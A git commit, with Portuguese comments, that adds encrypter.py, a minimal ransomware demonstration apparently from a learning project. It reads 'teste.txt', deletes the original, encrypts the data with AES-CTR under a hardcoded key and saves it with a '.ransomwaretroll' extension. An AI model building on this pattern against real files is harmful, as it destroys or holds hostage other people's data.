31fcf32b75c61cc0c45726d64dbfb41180a26e8c
Julia Stella <julia.paula@liferay.com>
2025-01-31 19:19:28 -0300

    Finalização do projeto

---
+++ encrypter.py
@@ -0,0 +1,31 @@
+import os
+import pyaes
+
+## Abrir o arquivo a ser criptografado
+
+file_name = "teste.txt"
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+
+
+## remover o arquivo original
+os.remove(file_name)
+
+## definir a chave de criptografia
+
+key = b"testeransomwares" # para a chave é necessario 16 caracteres
+aes = pyaes.AESModeOfOperationCTR(key)
+
+## criptografar o arquivo
+
+crypto_data = aes.encrypt(file_data)
+
+
+## salvar o arquivo criptografado
+
+
+new_file = file_name + ".ransomwaretroll"
+new_file = open(f'{new_file}','wb')
+new_file.write(crypto_data)
+new_file.close()
